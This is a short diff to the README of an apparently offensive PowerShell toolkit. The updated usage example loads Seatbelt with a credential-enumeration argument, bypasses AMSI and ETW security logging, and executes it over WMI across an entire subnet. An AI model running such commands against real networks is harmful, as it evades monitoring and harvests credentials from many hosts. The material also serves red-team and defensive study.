@@ -20,7 +20,7 @@ PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/B
 Run a .NET assembly through WMI while bypassing AMSI and Event Tracing for Windows (ETW):
 
 ```
-PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sample.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
+PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
 ```
 
 ## Credits
